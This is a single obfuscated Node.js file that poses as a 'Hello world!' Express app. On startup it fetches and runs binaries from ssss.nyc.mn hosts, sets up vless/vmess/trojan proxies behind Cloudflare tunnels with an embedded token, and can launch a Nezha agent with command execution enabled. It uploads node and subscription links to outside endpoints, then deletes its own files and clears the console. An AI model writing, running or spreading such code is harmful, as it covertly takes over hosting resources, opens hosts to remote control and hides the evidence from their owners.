const _0x1e3859=_0x58f5;(function(_0x5b102b,_0x4282d9){const _0x367544=_0x58f5,_0x2c5077=_0x5b102b();while(!![]){try{const _0x47281a=-parseInt(_0x367544(0x15b))/0x1+parseInt(_0x367544(0x13c))/0x2+-parseInt(_0x367544(0x120))/0x3*(parseInt(_0x367544(0x1aa))/0x4)+-parseInt(_0x367544(0x1ac))/0x5*(-parseInt(_0x367544(0x15d))/0x6)+-parseInt(_0x367544(0x128))/0x7*(-parseInt(_0x367544(0x18a))/0x8)+-parseInt(_0x367544(0x178))/0x9+-parseInt(_0x367544(0x19a))/0xa*(-parseInt(_0x367544(0x118))/0xb);if(_0x47281a===_0x4282d9)break;else _0x2c5077['push'](_0x2c5077['shift']());}catch(_0x330fbd){_0x2c5077['push'](_0x2c5077['shift']());}}}(_0x2242,0x7cfc0));const express=require(_0x1e3859(0x1a9)),app=express(),axios=require(_0x1e3859(0x13e)),os=require('os'),fs=require('fs'),path=require(_0x1e3859(0x195)),{promisify}=require('util'),exec=promisify(require(_0x1e3859(0x10f))[_0x1e3859(0x183)]),{execSync}=require(_0x1e3859(0x10f)),UPLOAD_URL=process[_0x1e3859(0x17b)][_0x1e3859(0x153)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x1e3859(0x17b)][_0x1e3859(0x1a8)]||![],FILE_PATH=process['env'][_0x1e3859(0x137)]||_0x1e3859(0x12e),SUB_PATH=process[_0x1e3859(0x17b)][_0x1e3859(0x1a6)]||_0x1e3859(0x126),PORT=process[_0x1e3859(0x17b)][_0x1e3859(0x107)]||process[_0x1e3859(0x17b)][_0x1e3859(0x142)]||0xc437,UUID=process[_0x1e3859(0x17b)][_0x1e3859(0x108)]||_0x1e3859(0x105),NEZHA_SERVER=process['env'][_0x1e3859(0x140)]||'',NEZHA_PORT=process[_0x1e3859(0x17b)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1e3859(0x17b)][_0x1e3859(0x171)]||'',ARGO_DOMAIN=process[_0x1e3859(0x17b)][_0x1e3859(0x192)]||_0x1e3859(0x12c),ARGO_AUTH=process[_0x1e3859(0x17b)][_0x1e3859(0x143)]||_0x1e3859(0xfd),ARGO_PORT=process[_0x1e3859(0x17b)][_0x1e3859(0x164)]||0x1f41,CFIP=process[_0x1e3859(0x17b)][_0x1e3859(0x116)]||'cdns.doon.eu.org',CFPORT=process[_0x1e3859(0x17b)]['CFPORT']||0x1bb,NAME=process[_0x1e3859(0x17b)]['NAME']||_0x1e3859(0x1b2);!fs[_0x1e3859(0x191)](FILE_PATH)?(fs[_0x1e3859(0x145)](FILE_PATH),console[_0x1e3859(0x135)](FILE_PATH+_0x1e3859(0x165))):console[_0x1e3859(0x135)](FILE_PATH+_0x1e3859(0x10d));function generateRandomName(){const _0x2a676e=_0x1e3859,_0x5c07d7='abcdefghijklmnopqrstuvwxyz';let _0x57c7aa='';for(let _0x122aed=0x0;_0x122aed<0x6;_0x122aed++){_0x57c7aa+=_0x5c07d7[_0x2a676e(0x16e)](Math[_0x2a676e(0x1b3)](Math[_0x2a676e(0x101)]()*_0x5c07d7[_0x2a676e(0x14b)]));}return _0x57c7aa;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x58f5(_0x53bafd,_0x6c2275){const _0x2242b0=_0x2242();return _0x58f5=function(_0x58f5aa,_0x4ef740){_0x58f5aa=_0x58f5aa-0xfd;let _0x2b99ff=_0x2242b0[_0x58f5aa];return _0x2b99ff;},_0x58f5(_0x53bafd,_0x6c2275);}let npmPath=path[_0x1e3859(0x17a)](FILE_PATH,npmName),phpPath=path[_0x1e3859(0x17a)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1e3859(0x17a)](FILE_PATH,botName),subPath=path[_0x1e3859(0x17a)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x1e3859(0x154)),configPath=path[_0x1e3859(0x17a)](FILE_PATH,'config.json');function deleteNodes(){const _0x3a24d2=_0x1e3859;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x286f37;try{_0x286f37=fs[_0x3a24d2(0x18c)](subPath,_0x3a24d2(0x130));}catch{return null;}const _0x4c486a=Buffer[_0x3a24d2(0x1a7)](_0x286f37,_0x3a24d2(0x1a3))[_0x3a24d2(0x1ab)](_0x3a24d2(0x130)),_0x5b4e7d=_0x4c486a[_0x3a24d2(0x169)]('\x0a')[_0x3a24d2(0x124)](_0xa27941=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3a24d2(0x198)](_0xa27941));if(_0x5b4e7d['length']===0x0)return;return axios[_0x3a24d2(0x14f)](UPLOAD_URL+_0x3a24d2(0x122),JSON[_0x3a24d2(0x1a5)]({'nodes':_0x5b4e7d}),{'headers':{'Content-Type':_0x3a24d2(0x129)}})[_0x3a24d2(0x18b)](_0x43b8fb=>{return null;}),null;}catch(_0x467a43){return null;}}function cleanupOldFiles(){const _0x510985=_0x1e3859;try{const _0x10bdae=fs[_0x510985(0x14e)](FILE_PATH);_0x10bdae[_0x510985(0x125)](_0x19290b=>{const _0x20547d=_0x510985,_0x4a5bde=path[_0x20547d(0x17a)](FILE_PATH,_0x19290b);try{const _0x1854d9=fs[_0x20547d(0x176)](_0x4a5bde);_0x1854d9['isFile']()&&fs[_0x20547d(0x11f)](_0x4a5bde);}catch(_0x52a817){}});}catch(_0x19b9ad){}}app[_0x1e3859(0x151)]('/',function(_0x224b08,_0x531eda){const _0x5905b1=_0x1e3859;_0x531eda['send'](_0x5905b1(0x117));});async function generateConfig(){const _0x2f9238=_0x1e3859,_0xd95301={'log':{'access':'/dev/null','error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2f9238(0x1a2),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x2f9238(0x173),'fallbacks':[{'dest':0xbb9},{'path':_0x2f9238(0x121),'dest':0xbba},{'path':_0x2f9238(0x180),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2f9238(0x15e)}},{'port':0xbb9,'listen':_0x2f9238(0x103),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2f9238(0x173)},'streamSettings':{'network':_0x2f9238(0x15e),'security':_0x2f9238(0x173)}},{'port':0xbba,'listen':_0x2f9238(0x103),'protocol':_0x2f9238(0x1a2),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2f9238(0x173)},'streamSettings':{'network':'ws','security':_0x2f9238(0x173),'wsSettings':{'path':_0x2f9238(0x121)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f9238(0x158),'tls',_0x2f9238(0x10a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2f9238(0x103),'protocol':_0x2f9238(0x10b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2f9238(0x180)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f9238(0x158),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2f9238(0x103),'protocol':_0x2f9238(0x16f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2f9238(0x173),'wsSettings':{'path':_0x2f9238(0x144)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f9238(0x158),_0x2f9238(0x19b),_0x2f9238(0x10a)],'metadataOnly':![]}}],'dns':{'servers':[_0x2f9238(0x194)]},'outbounds':[{'protocol':_0x2f9238(0x111),'tag':_0x2f9238(0x177)},{'protocol':_0x2f9238(0x119),'tag':_0x2f9238(0x1b5)}]};fs[_0x2f9238(0x100)](path[_0x2f9238(0x17a)](FILE_PATH,_0x2f9238(0x1b6)),JSON['stringify'](_0xd95301,null,0x2));}function _0x2242(){const _0x4c2dbe=['\x20-p\x20','includes','\x20-c\x20','\x0a\x20\x20\x20\x20','length','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/agent','readdirSync','post','arm','get','pop','UPLOAD_URL','boot.log','pkill\x20-f\x20\x22[','data','status','http','\x0a\x20\x20credentials-file:\x20','443','771748FyUmJX','NEZHA\x20variable\x20is\x20empty,skip\x20running','79854YbEKvU','tcp','arch','taskkill\x20/f\x20/im\x20','2087','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2083','ARGO_PORT','\x20is\x20created','Unhandled\x20error\x20in\x20startserver:','close','https://arm64.ssss.nyc.mn/web','split','\x0a\x20\x20\x0atrojan://','\x20failed:\x20','firefox','fileName','charAt','trojan','https://oooo.serv00.net/add-url','NEZHA_KEY','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','none','map','Nodes\x20uploaded\x20successfully','statSync','direct','1874610GYXAXV','Empowerment\x20success\x20for\x20','join','env','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','npm\x20running\x20error:\x20','Download\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/vmess-argo','http\x20server\x20is\x20running\x20on\x20port:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','exec','clear','web\x20running\x20error:\x20','del\x20/f\x20/q\x20','automatic\x20access\x20task\x20added\x20successfully','nohup\x20','8443','3526048tKTdYk','catch','readFileSync','push','--tls','tunnel.json','platform','existsSync','ARGO_DOMAIN','basename','https+local://8.8.8.8/dns-query','path','Error\x20executing\x20command:\x20','win32','test','/api/add-subscriptions','170ruukGG','tls','https://amd64.ssss.nyc.mn/web','?security=tls&sni=','\x20is\x20running','php\x20running\x20error:\x20','stream','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','vless','base64','\x0a\x20\x20tunnel:\x20','stringify','SUB_PATH','from','AUTO_ACCESS','express','28dkLgRg','toString','355NbKCaF','listen','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','response','2096','git','floor','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','block','config.json','eyJhIjoiNjY3YjI1Y2Y0NmVlNzY4NGNhZGJkYjIzYzM2MzBkZGUiLCJ0IjoiYjA2NGJjOTAtZmEzYi00NmRiLTg5OWQtMjAwYzc0ZWE2OWEwIiwicyI6Ik9HVTNOemxtWVRVdFlUQmpNaTAwWW1NMkxXSmpaV1l0WkRNM1lUazRaalkyTlRnMyJ9','\x20>/dev/null\x202>&1\x20&','TunnelSecret','writeFileSync','random','\x20successfully','127.0.0.1','Empowerment\x20failed\x20for\x20','d43ddf42-968f-4fa4-8734-440756068e87','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','SERVER_PORT','UUID','/vmess-argo?ed=2560','quic','vmess','https://amd64.ssss.nyc.mn/agent','\x20already\x20exists','/sub.txt\x20saved\x20successfully','child_process','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','freedom','text/plain;\x20charset=utf-8','error','chmod','message','CFIP','Hello\x20world!','42493SMcsNk','blackhole','unlink','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','App\x20is\x20running','?encryption=none&security=tls&sni=','send','unlinkSync','414825OTkVVV','/vless-argo','/api/delete-nodes','unshift','filter','forEach','sub','2053','7grvaxO','application/json','Subscription\x20uploaded\x20successfully','then','git.amsy.eu.org','&fp=firefox&type=ws&host=','./tmp','Error\x20downloading\x20files:','utf-8','\x0aclient_secret:\x20','arm64','match','/config.json\x20>/dev/null\x202>&1\x20&','log','\x20-c\x20\x22','FILE_PATH','&path=%2Ftrojan-argo%3Fed%3D2560#','Error\x20reading\x20boot.log:','rm\x20-rf\x20','pipe','2017066tLTYUy','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','axios','/api/add-nodes','NEZHA_SERVER','Skipping\x20adding\x20automatic\x20access\x20task','PORT','ARGO_AUTH','/trojan-argo','mkdirSync','finish'];_0x2242=function(){return _0x4c2dbe;};return _0x2242();}function getSystemArchitecture(){const _0x2a9038=_0x1e3859,_0x3cd50e=os[_0x2a9038(0x15f)]();return _0x3cd50e===_0x2a9038(0x150)||_0x3cd50e===_0x2a9038(0x132)||_0x3cd50e==='aarch64'?_0x2a9038(0x150):'amd';}function downloadFile(_0x3c4927,_0x15fe14,_0x34e8d6){const _0x355f9b=_0x1e3859,_0x37b7f7=_0x3c4927;!fs['existsSync'](FILE_PATH)&&fs[_0x355f9b(0x145)](FILE_PATH,{'recursive':!![]});const _0x57c1e8=fs['createWriteStream'](_0x37b7f7);axios({'method':_0x355f9b(0x151),'url':_0x15fe14,'responseType':_0x355f9b(0x1a0)})[_0x355f9b(0x12b)](_0x73f593=>{const _0x36f74a=_0x355f9b;_0x73f593[_0x36f74a(0x156)][_0x36f74a(0x13b)](_0x57c1e8),_0x57c1e8['on'](_0x36f74a(0x146),()=>{const _0x360f5f=_0x36f74a;_0x57c1e8[_0x360f5f(0x167)](),console['log'](_0x360f5f(0x17e)+path[_0x360f5f(0x193)](_0x37b7f7)+_0x360f5f(0x102)),_0x34e8d6(null,_0x37b7f7);}),_0x57c1e8['on'](_0x36f74a(0x113),_0x3bf335=>{const _0x896625=_0x36f74a;fs[_0x896625(0x11a)](_0x37b7f7,()=>{});const _0x18d9d3='Download\x20'+path[_0x896625(0x193)](_0x37b7f7)+'\x20failed:\x20'+_0x3bf335['message'];console[_0x896625(0x113)](_0x18d9d3),_0x34e8d6(_0x18d9d3);});})[_0x355f9b(0x18b)](_0x4d4762=>{const _0x5eab83=_0x355f9b,_0x110718=_0x5eab83(0x17e)+path[_0x5eab83(0x193)](_0x37b7f7)+_0x5eab83(0x16b)+_0x4d4762[_0x5eab83(0x115)];console['error'](_0x110718),_0x34e8d6(_0x110718);});}async function downloadFilesAndRun(){const _0x26b8af=_0x1e3859,_0x2d0ebc=getSystemArchitecture(),_0x1ebcd7=getFilesForArchitecture(_0x2d0ebc);if(_0x1ebcd7[_0x26b8af(0x14b)]===0x0){console[_0x26b8af(0x135)](_0x26b8af(0x172));return;}const _0x4f70c7=_0x1ebcd7[_0x26b8af(0x174)](_0x98fd29=>{return new Promise((_0x6cc8,_0x1bf653)=>{const _0x47920d=_0x58f5;downloadFile(_0x98fd29[_0x47920d(0x16d)],_0x98fd29['fileUrl'],(_0x1ac813,_0x180bcd)=>{_0x1ac813?_0x1bf653(_0x1ac813):_0x6cc8(_0x180bcd);});});});try{await Promise['all'](_0x4f70c7);}catch(_0x36e3b6){console[_0x26b8af(0x113)](_0x26b8af(0x12f),_0x36e3b6);return;}function _0x571417(_0x380c58){const _0x11f64a=_0x26b8af,_0x5d23b8=0x1fd;_0x380c58[_0x11f64a(0x125)](_0x4edc12=>{const _0x1a291d=_0x11f64a;fs[_0x1a291d(0x191)](_0x4edc12)&&fs[_0x1a291d(0x114)](_0x4edc12,_0x5d23b8,_0x4b4016=>{const _0x4b349c=_0x1a291d;_0x4b4016?console[_0x4b349c(0x113)](_0x4b349c(0x104)+_0x4edc12+':\x20'+_0x4b4016):console[_0x4b349c(0x135)](_0x4b349c(0x179)+_0x4edc12+':\x20'+_0x5d23b8[_0x4b349c(0x1ab)](0x8));});});}const _0x997612=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x571417(_0x997612);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17f1b6=NEZHA_SERVER[_0x26b8af(0x148)](':')?NEZHA_SERVER[_0x26b8af(0x169)](':')[_0x26b8af(0x152)]():'',_0x295560=new Set(['443',_0x26b8af(0x189),'2096',_0x26b8af(0x161),_0x26b8af(0x163),_0x26b8af(0x127)]),_0x2370cd=_0x295560['has'](_0x17f1b6)?'true':'false',_0xcb44eb=_0x26b8af(0x131)+NEZHA_KEY+_0x26b8af(0x1ae)+NEZHA_SERVER+_0x26b8af(0x182)+_0x2370cd+_0x26b8af(0x162)+UUID;fs[_0x26b8af(0x100)](path[_0x26b8af(0x17a)](FILE_PATH,'config.yaml'),_0xcb44eb);const _0x2fc488='nohup\x20'+phpPath+_0x26b8af(0x136)+FILE_PATH+_0x26b8af(0x1af);try{await exec(_0x2fc488),console[_0x26b8af(0x135)](phpName+'\x20is\x20running'),await new Promise(_0x591791=>setTimeout(_0x591791,0x3e8));}catch(_0x289683){console['error'](_0x26b8af(0x19f)+_0x289683);}}else{let _0x340e38='';const _0x4899ca=[_0x26b8af(0x15a),_0x26b8af(0x189),_0x26b8af(0x1b1),_0x26b8af(0x161),_0x26b8af(0x163),'2053'];_0x4899ca[_0x26b8af(0x148)](NEZHA_PORT)&&(_0x340e38=_0x26b8af(0x18e));const _0x3aa075='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x26b8af(0x147)+NEZHA_KEY+'\x20'+_0x340e38+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3aa075),console[_0x26b8af(0x135)](npmName+_0x26b8af(0x19e)),await new Promise(_0xd27dff=>setTimeout(_0xd27dff,0x3e8));}catch(_0x39a978){console[_0x26b8af(0x113)](_0x26b8af(0x17d)+_0x39a978);}}}else console[_0x26b8af(0x135)](_0x26b8af(0x15c));const _0x5cfdd4=_0x26b8af(0x188)+webPath+_0x26b8af(0x149)+FILE_PATH+_0x26b8af(0x134);try{await exec(_0x5cfdd4),console['log'](webName+_0x26b8af(0x19e)),await new Promise(_0x1251e8=>setTimeout(_0x1251e8,0x3e8));}catch(_0x21657e){console['error'](_0x26b8af(0x185)+_0x21657e);}if(fs[_0x26b8af(0x191)](botPath)){let _0x340c61;if(ARGO_AUTH[_0x26b8af(0x133)](/^[A-Z0-9a-z=]{120,250}$/))_0x340c61=_0x26b8af(0x17c)+ARGO_AUTH;else ARGO_AUTH[_0x26b8af(0x133)](/TunnelSecret/)?_0x340c61=_0x26b8af(0x110)+FILE_PATH+'/tunnel.yml\x20run':_0x340c61=_0x26b8af(0x13d)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x26b8af(0x188)+botPath+'\x20'+_0x340c61+_0x26b8af(0xfe)),console[_0x26b8af(0x135)](botName+'\x20is\x20running'),await new Promise(_0x29a289=>setTimeout(_0x29a289,0x7d0));}catch(_0x36d4ad){console[_0x26b8af(0x113)](_0x26b8af(0x196)+_0x36d4ad);}}await new Promise(_0x1c7bae=>setTimeout(_0x1c7bae,0x1388));}function getFilesForArchitecture(_0x15a5e0){const _0x24e134=_0x1e3859;let _0x20aa34;_0x15a5e0==='arm'?_0x20aa34=[{'fileName':webPath,'fileUrl':_0x24e134(0x168)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x20aa34=[{'fileName':webPath,'fileUrl':_0x24e134(0x19c)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5cfdf1=_0x15a5e0==='arm'?_0x24e134(0x14d):_0x24e134(0x10c);_0x20aa34[_0x24e134(0x123)]({'fileName':npmPath,'fileUrl':_0x5cfdf1});}else{const _0x45f74a=_0x15a5e0==='arm'?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x20aa34[_0x24e134(0x123)]({'fileName':phpPath,'fileUrl':_0x45f74a});}}return _0x20aa34;}function argoType(){const _0x5548df=_0x1e3859;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5548df(0x135)](_0x5548df(0x17f));return;}if(ARGO_AUTH['includes'](_0x5548df(0xff))){fs[_0x5548df(0x100)](path[_0x5548df(0x17a)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x5c7c8e=_0x5548df(0x1a4)+ARGO_AUTH[_0x5548df(0x169)]('\x22')[0xb]+_0x5548df(0x159)+path[_0x5548df(0x17a)](FILE_PATH,_0x5548df(0x18f))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x5548df(0x100)](path[_0x5548df(0x17a)](FILE_PATH,'tunnel.yml'),_0x5c7c8e);}else console[_0x5548df(0x135)](_0x5548df(0x106));}argoType();async function extractDomains(){const _0x416a1e=_0x1e3859;let _0x56cd9c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x56cd9c=ARGO_DOMAIN,console[_0x416a1e(0x135)]('ARGO_DOMAIN:',_0x56cd9c),await _0x10999f(_0x56cd9c);else try{const _0x5a8e4f=fs[_0x416a1e(0x18c)](path['join'](FILE_PATH,_0x416a1e(0x154)),'utf-8'),_0x3b0c4b=_0x5a8e4f[_0x416a1e(0x169)]('\x0a'),_0x1a054e=[];_0x3b0c4b[_0x416a1e(0x125)](_0x131af6=>{const _0x5b2cc4=_0x416a1e,_0x51778f=_0x131af6['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x51778f){const _0xdd4d1c=_0x51778f[0x1];_0x1a054e[_0x5b2cc4(0x18d)](_0xdd4d1c);}});if(_0x1a054e[_0x416a1e(0x14b)]>0x0)_0x56cd9c=_0x1a054e[0x0],console[_0x416a1e(0x135)]('ArgoDomain:',_0x56cd9c),await _0x10999f(_0x56cd9c);else{console[_0x416a1e(0x135)](_0x416a1e(0x1b4)),fs[_0x416a1e(0x11f)](path['join'](FILE_PATH,_0x416a1e(0x154)));async function _0x4588c0(){const _0x571fab=_0x416a1e;try{process[_0x571fab(0x190)]==='win32'?await exec(_0x571fab(0x160)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x571fab(0x155)+botName[_0x571fab(0x16e)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x501a57){}}_0x4588c0(),await new Promise(_0x2ba476=>setTimeout(_0x2ba476,0xbb8));const _0x9ee9db='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x9ee9db+_0x416a1e(0xfe)),console['log'](botName+_0x416a1e(0x19e)),await new Promise(_0x1e000a=>setTimeout(_0x1e000a,0xbb8)),await extractDomains();}catch(_0x3c4ef3){console[_0x416a1e(0x113)](_0x416a1e(0x196)+_0x3c4ef3);}}}catch(_0x211e12){console['error'](_0x416a1e(0x139),_0x211e12);}async function _0x10999f(_0x458aa4){const _0x37b048=_0x416a1e,_0x2c645d=execSync(_0x37b048(0x1a1),{'encoding':'utf-8'}),_0x1f4837=_0x2c645d['trim'](),_0x46629c=NAME?NAME+'-'+_0x1f4837:_0x1f4837;return new Promise(_0x3263c8=>{setTimeout(()=>{const _0x1d5cea=_0x58f5,_0x17fa79={'v':'2','ps':''+_0x46629c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1d5cea(0x173),'net':'ws','type':'none','host':_0x458aa4,'path':_0x1d5cea(0x109),'tls':_0x1d5cea(0x19b),'sni':_0x458aa4,'alpn':'','fp':_0x1d5cea(0x16c)},_0x59d3ed='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1d5cea(0x11d)+_0x458aa4+_0x1d5cea(0x12d)+_0x458aa4+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x46629c+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0x1d5cea(0x1a5)](_0x17fa79))[_0x1d5cea(0x1ab)](_0x1d5cea(0x1a3))+_0x1d5cea(0x16a)+UUID+'@'+CFIP+':'+CFPORT+_0x1d5cea(0x19d)+_0x458aa4+_0x1d5cea(0x12d)+_0x458aa4+_0x1d5cea(0x138)+_0x46629c+_0x1d5cea(0x14a);console[_0x1d5cea(0x135)](Buffer[_0x1d5cea(0x1a7)](_0x59d3ed)['toString'](_0x1d5cea(0x1a3))),fs[_0x1d5cea(0x100)](subPath,Buffer[_0x1d5cea(0x1a7)](_0x59d3ed)[_0x1d5cea(0x1ab)]('base64')),console[_0x1d5cea(0x135)](FILE_PATH+_0x1d5cea(0x10e)),uploadNodes(),app[_0x1d5cea(0x151)]('/'+SUB_PATH,(_0x230f0e,_0xabcecd)=>{const _0xc294d4=_0x1d5cea,_0x3e4f9d=Buffer[_0xc294d4(0x1a7)](_0x59d3ed)['toString']('base64');_0xabcecd['set']('Content-Type',_0xc294d4(0x112)),_0xabcecd[_0xc294d4(0x11e)](_0x3e4f9d);}),_0x3263c8(_0x59d3ed);},0x7d0);});}}async function uploadNodes(){const _0x23a79b=_0x1e3859;if(UPLOAD_URL&&PROJECT_URL){const _0xc2791f=PROJECT_URL+'/'+SUB_PATH,_0x12a7a4={'subscription':[_0xc2791f]};try{const _0x2da4cd=await axios['post'](UPLOAD_URL+_0x23a79b(0x199),_0x12a7a4,{'headers':{'Content-Type':'application/json'}});return _0x2da4cd&&_0x2da4cd['status']===0xc8?(console[_0x23a79b(0x135)](_0x23a79b(0x12a)),_0x2da4cd):null;}catch(_0x4a5ae1){if(_0x4a5ae1[_0x23a79b(0x1b0)]){if(_0x4a5ae1[_0x23a79b(0x1b0)][_0x23a79b(0x157)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x23a79b(0x191)](listPath))return;const _0x1a143f=fs[_0x23a79b(0x18c)](listPath,_0x23a79b(0x130)),_0x36e648=_0x1a143f['split']('\x0a')['filter'](_0xb6c751=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xb6c751));if(_0x36e648['length']===0x0)return;const _0x1a8bb3=JSON[_0x23a79b(0x1a5)]({'nodes':_0x36e648});try{const _0x565168=await axios[_0x23a79b(0x14f)](UPLOAD_URL+_0x23a79b(0x13f),_0x1a8bb3,{'headers':{'Content-Type':_0x23a79b(0x129)}});return _0x565168&&_0x565168[_0x23a79b(0x157)]===0xc8?(console[_0x23a79b(0x135)](_0x23a79b(0x175)),_0x565168):null;}catch(_0x4a7d36){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x334b85=_0x58f5,_0x1ad7f0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1ad7f0[_0x334b85(0x18d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1ad7f0[_0x334b85(0x18d)](phpPath);process[_0x334b85(0x190)]===_0x334b85(0x197)?exec(_0x334b85(0x186)+_0x1ad7f0[_0x334b85(0x17a)]('\x20')+'\x20>\x20nul\x202>&1',_0x3324e5=>{const _0x5a111e=_0x334b85;console[_0x5a111e(0x184)](),console[_0x5a111e(0x135)](_0x5a111e(0x11c)),console[_0x5a111e(0x135)](_0x5a111e(0x11b));}):exec(_0x334b85(0x13a)+_0x1ad7f0[_0x334b85(0x17a)]('\x20')+_0x334b85(0x14c),_0x18d3ed=>{const _0x2e5e04=_0x334b85;console['clear'](),console['log'](_0x2e5e04(0x11c)),console['log'](_0x2e5e04(0x11b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3b5fd8=_0x1e3859;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3b5fd8(0x135)](_0x3b5fd8(0x141));return;}try{const _0xa5dbf=await axios[_0x3b5fd8(0x14f)](_0x3b5fd8(0x170),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x3b5fd8(0x135)](_0x3b5fd8(0x187)),_0xa5dbf;}catch(_0x1a755c){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x1a755c[_0x3b5fd8(0x115)]),null;}}async function startserver(){const _0x17e713=_0x1e3859;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x39f215){console[_0x17e713(0x113)]('Error\x20in\x20startserver:',_0x39f215);}}startserver()[_0x1e3859(0x18b)](_0x723278=>{const _0x19153d=_0x1e3859;console['error'](_0x19153d(0x166),_0x723278);}),app[_0x1e3859(0x1ad)](PORT,()=>console[_0x1e3859(0x135)](_0x1e3859(0x181)+PORT+'!'));
